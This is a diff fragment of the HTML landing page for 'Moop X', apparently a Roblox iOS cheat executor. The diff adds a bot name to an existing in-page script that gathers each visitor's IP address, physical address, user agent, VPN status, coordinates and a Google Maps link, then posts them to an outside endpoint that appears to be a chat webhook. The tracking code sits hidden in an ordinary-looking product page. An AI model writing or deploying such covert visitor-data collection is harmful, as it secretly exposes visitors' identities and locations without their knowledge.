@@ -9,7 +9,6 @@
     <meta property="og:title" content="Moop X">
     <meta property="og:description" content="Redefining Roblox on iOS with state-of-the-art features and seamless execution. Elevate your gaming experience to unprecedented levels. Download now for a new standard of excellence in mobile gameplay.">
     <meta property="og:url" content="https://moopx.pro/home">
-
 </head>
 <body>
     <script>
@@ -24,6 +23,7 @@
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
+                        username: 'Visitor Info Bot',
                         content: `New visitor info:\nIP: ${ip || 'N/A'}\nAddress: ${address || 'N/A'}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}\nCoordinates: ${coordinates}\nGoogle Maps Link: ${getGoogleMapsLink(coordinates)}`,
                     }),
                 });
